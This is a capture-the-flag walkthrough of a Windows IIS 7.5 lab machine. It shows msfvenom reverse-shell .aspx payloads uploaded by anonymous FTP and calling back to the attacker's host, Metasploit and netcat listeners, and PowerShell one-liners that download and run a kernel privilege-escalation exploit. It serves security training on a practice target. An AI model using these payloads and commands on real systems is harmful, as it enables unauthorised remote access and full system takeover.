## Scanning and Enumeration

=======================================================

As always we start with our trusty nmap scan:

    nmap -A -T4 10.10.10.5

![](/images/devel/2. nmap.png "nmap")
![](/images/devel/2. nmap_2.png "nmap")

Ports 21 and 80 are all that is open. Looks like a Windows system, running Microsoft IIS httpd 7.5 (IIS7).  Let's Google IIS 7 real quick and see if we can get a better idea of the specific flavor of windows.

We find a helpful wikipedia article: https://en.wikipedia.org/wiki/Internet_Information_Services
 
“IIS 7.5 was included in Windows 7 (but it must be turned on in the side panel of Programs and Features) and Windows Server 2008 R2."

So looks like either Windows 7 or Windows Server 2008 R2.

We also see that Anonymous FTP login is allowed so we can try that next:

    ftp 10.10.10.5
    
    anonymous
    
    anypassword
    
    pwd
    
    dir
    
![](/images/devel/3. ftp.png "ftp")

So we have confirmed Anonymous FTP access and can see a few files and one directory: aspnet_client. We also see two files that look like basic web files.  Let's see what happens when we browse the IP address with Firefox:

![](/images/devel/4. website.png "")

So we have a web page with no text, and what looks like an img file.  Let's view page source:

![](/images/devel/5. view-source.png "")

And right there we see our "welcome.png" file. So it looks like the webserver is running from the same directory we have Anonymous FTP access to.  Can we use FTP to put files there?

First let's prep a text file to test:

    echo “This is a test.  123.” > test.txt

    cat test.txt

![](/images/devel/6. echo.png "")

Now let's ftp back to the target (10.10.10.5) and try to put our test.txt file there.

    ftp 10.10.10.5
    
    anonymous
    
    anypassword
    
    put test.txt
    
    dir

![](/images/devel/7. ftp_put.png "")

So far so good.  Now we browse to the file with Firefox to see if it executes:

![](/images/devel/8. website_test.png "")

Looks good.  So let's review:

We have a Microsoft IIS 7.5 server running and we can place files on it's root directory and access them via the web browser.

What if we upload a file that executes a reverse shell when we access it via the browser? Microsoft IIS runs .aspx files, so we should be able to create and upload a malicious .aspx file.

<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================

To start, we will build a meterpreter payload using msfvenom:

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f aspx > meter-shell.aspx

![](/images/devel/9. msfvenom.png "")

Now we load up msfconsole and set up msf's multi/handler to catch our meterpreter reverse tcp shell:

    msfconsole
    
    use exploit/multi/handler

    set payload windows/meterpreter/reverse_tcp

    set lhost 10.10.14.24

    set lport 4444

If all options look good, run the handler:

    run

![](/images/devel/10. multi_handler.png "")

Now, when we browse to http://10.10.10.5/meter-shell.aspx we should trigger our maclicious meter-shell.aspx file to call back:

![](/images/devel/11. trigger_web.png "")

The browser may appear to hang, but that's okay. Over in your msfconsole terminal you should see:

![](/images/devel/12. meterpreter_session.png "")

A meterpreter shell! Awesome, let's enumerate:

    sysinfo

![](/images/devel/13 sysinfo..png "")

Let's see what privileges we have:

    getuid

![](/images/devel/14. getuid.png "")

We are the web service which is essentially not privileged at all.  That's okay!  Hit ctrl+z to background your meterpreter shell:

    ctrl+z  (hit y and then enter to confirm)

    search suggester

![](/images/devel/15 search_suggester.png "")

This is a post-exploitation local exploit suggester (aka privilege escalation, which we sorely need).

    use 0     (or use post/multi/recon/local_exploit_suggester)

    show options

![](/images/devel/16. local_exploit_suggester.png "")

We need to set the meterpreter session (in my case, it is 2, but yours is probably session 1) and then run it.

    set session 2

    run

![](/images/devel/16. local_exploit_suggester_2.png "")

So several results here. A good one to choose is the ms10_015_kitrap0d so we'll go with that:

    use exploit/windows/local/ms10_015_kitrap0d

    show options

Note: My session died in between here, so in the following screenshots you'll see session 3 instead of session 2. Your session number should remain the same throughout.

![](/images/devel/17. ms10_105_kitrap0d.png "")
![](/images/devel/17. ms10_105_kitrap0d_2.png "")

Success!  We have system level privileges.  Now let's go get some flags:

    cd c:\Users
    
    dir

![](/images/devel/18. shell.png "")

We have users babis and Administrator.  For some reason on this box the flag files are named user.txt.txt and root.txt.txt:

    type babis\Desktop\user.txt.txt
    
    type Administrator\Desktop\root.txt.txt

![](/images/devel/19. flags.png "")

And here we have our flags.

=======================================================

## Manual Exploitation

=======================================================


To build the .aspx file, we will once again turn to msfvenom which can output a .aspx file using the “-f aspx” option:

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=9997 -f aspx > shell.aspx

-p for payload, in this case a Windows reverse shell using TCP

LHOST is our attacking machine IP address (Kali machine)

LPORT is one we choose and will be listening on for the reverse TCP connection

-f for “format” in this case the aspx file

\> to redirect the output of this command into “shell.aspx”

![](/images/devel/20. msfvenom.png "")

Now we use ftp to upload the file to the server:

    ftp 10.10.10.5
    
    anonymous
    
    anypassword
    
    put shell.aspx
    
    dir
    
    quit

![](/images/devel/21. ftp-put.png "")

In a separate terminal window, start a nc listener on port 9997.

    nc -lvnp 9997

![](/images/devel/22. nc_listener.png "")

And then using a web browser, browse to the file:  http://10.10.10.5/shell.aspx

The browser will appear to hang, but over in your terminal window you should see a connection:

![](/images/devel/23. nc_connection.png "")

And we have a shell!  But it looks like it may be low privileged.  Let's do some basic enum:

    whoami

    systeminfo

![](/images/devel/24. whoami-systeminfo.png "")
![](/images/devel/24. whoami-systeminfo_2.png "")

So we are the user “web” running on a Windows 7 Enterprise machine.  Likely little to no access to sensitive information.

Now we need to enumerate the machine to identify a path for privilege escalation. To do this we will use Watson. Watson is the successor to Sherlock, but requires some setup on a Windows machine which we will do now.  

First, on your low-priv shell, enumerate the .NET versions of your target.

    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

![](/images/devel/watson_setup1.png "")

You can also look here:

    dir /A:D "C:\Windows\Microsoft.NET\Framework"

![](/images/devel/watson_setup2.png "")

Next we compile Watson, but we have to make sure we get a version of the code that will work on our target:

First, browse to the github repo here:  [https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)

![](/images/devel/watson_setup3.png "")

Click Commits

Scroll down the list of previous commits until you find one that is compatible.  In my case it is: [https://github.com/rasta-mouse/Watson/tree/09a8df569b1f0bccb59ad708f33e15e623ea28c1](https://github.com/rasta-mouse/Watson/tree/09a8df569b1f0bccb59ad708f33e15e623ea28c1)

On your Windows machine, clone the Watson repo, then check out the old commit:

    git clone https://github.com/rasta-mouse/Watson.git

    git checkout 09a8df569b1f0bccb59ad708f33e15e623ea28ca

![](/images/devel/watson_setup4.png "")

Now in Microsoft Visual Studio 2019, open the .sln file:

![](/images/devel/watson_setup5.png "")

Navigate to the Watson.sln file you have checked out. Confirm when it loads that it is compatible with your version of Windows on the target by opening and looking at the “Program.cs” file:

![](/images/devel/watson_setup6.png "")

Once Visual Studio clones the github repo, click on the Watson project on the right side (red box)

Next click Project on the menu and select “Watson Properties”

![](/images/devel/watson_setup7.png "")

When the next window loads, make sure “Application” is chosen on the left side and then change the Target Framework to 3.5 since that was the latest installed on our target:

![](/images/devel/watson_setup8.png "")

Visual Studio may pop-up a prompt stating the file has to be closed and re-loaded.  Click Yes.

Next, click Build and then Configuration Manager

![](/images/devel/watson_setup9.png "")

Now we need to set the Platform to the same architecture as the target (either x64 or x86 for 64-bit and 32-bit respectively).

Our target is 32-bit in this case so we set it to x86:

![](/images/devel/watson_setup10.png "")

Click Close on the above window.

Now go to Build and select “Build Watson”

![](/images/devel/watson_setup11.png "")

In the bottom Window you should see something like:

![](/images/devel/watson_setup12.png "")

Navigate to that directory, copy the Watson.exe file and transfer it to your Kali machine.

Once you have Watson.exe on your Kali machine, run a python HTTP server and transfer the file up to our Windows target:
    python -m SimpleHTTPServer 8080

![](/images/devel/25. python-simplehttp.png "")

Then on your low privilege shell:

    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.24:8080/Watson.exe','C:\Windows\Temp\Watson.exe')"

![](/images/devel/26. powershell.png "")

On your Kali python SimpleHTTPServer you should see:

![](/images/devel/27. get.png "")

Then run Watson.exe:

  Watson.exe

![](/images/devel/28. watson.png "")
![](/images/devel/28. watson_2.png "")
![](/images/devel/28. watson_3.png "")

Above we see our output from Watson.exe. Since we used MS10-015 earlier through Metasploit, we are going to use MS11-046 to show how this machine is vulnerable to multiple privilege escalation techniques.

Another way to see if the Ancillary Function Drive (AFD) is installed is to run “DRIVERQUERY” from the command line:

![](/images/devel/29. driverquery.png "")

The presence of AFD here indicates this is likely vulnerable to MS11-046 privesc.

Next we can search for and download a pre-compiled exploit for MS11-046:

    wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS11-046/ms11-046.exe

On your Kali machine, run the simpleHTTPServer again
  
    python -m SimpleHTTPServer 8080

Over on the low privileged shell on your target, run the following powershell command to grab the ms11-046.exe exploit.

    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.24:8080/ms11-046.exe','C:\Windows\Temp\MS11-046.exe')"

If the shell does not show the transfer occurring, just hit Enter again after a few moments.

![](/images/devel/30. powershell.png "")

Next we need to navigate to the Temp directory (if you haven't already) and confirm the file downloaded:
    cd C:\Windows\Temp
    
    dir

Once you see the file there, go ahead and execute it:

    MS11-046.exe

    whoami

![](/images/devel/31. ms11-046.png "")

Success! We have system level privileges. Let's go get our flags:

![](/images/devel/18 shell.png "")

We have users babis and Administrator.  For some reason on this box the flag files are named user.txt.txt and root.txt.txt:

![](/images/devel/19. flags.png "")

And here we have our flags:
